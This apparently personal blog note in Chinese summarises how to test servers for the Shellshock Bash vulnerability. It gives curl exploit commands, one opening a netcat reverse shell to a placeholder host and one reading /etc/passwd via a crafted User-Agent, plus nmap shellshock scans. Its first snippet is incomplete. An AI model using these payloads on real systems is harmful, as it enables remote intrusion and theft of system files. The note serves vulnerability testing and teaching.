---
title: "測試伺服器是否易受 Shellshock 漏洞影響"
date: 2022-11-28T15:35:30+08:00
menu:
  sidebar:
    name: "測試伺服器是否易受 Shellshock 漏洞影響"
    identifier: linux-shell-shellshock-bug
    weight: 10
tags: ["Links", "Linux", "SHELL", "command line"]
categories: ["Links", "Linux", "SHELL", "command line"]
hero: images/hero/linux.png
---

- [測試伺服器是否易受 Shellshock 漏洞影響](https://www.baeldung.com/linux/shellshock-bug)

##### Shellshock 漏洞

```bash
env x=' () {:;};'
```

##### 利用 Shellshock 漏洞

- 當功能忽略使用者指定的指令，改執行 ForceCommand 的內容時，置換指令就會被執行。
- 使用者的原始指令會被放在 "SSH_ORIGINAL_COMMAND" 環境變數中。若使用者預設 shell 是 Bash，Bash 在啟動時會解析 "SSH_ORIGINAL_COMMAND" 的值並執行其中的指令。

##### Shellshock 利用指令範例

```bash
## 1
curl -H "X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443" 192.168.x.y/CGI-bin/hello.cgi

## 2
curl --insecure 192.168.x.x -H "User-Agent: () { :; }; /bin/cat /etc/passwd"
```

- 使用 nmap 腳本測試漏洞

```bash
nmap -sV -p- --script http-shellshock 192.168.x.x
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls 192.168.x.x
```
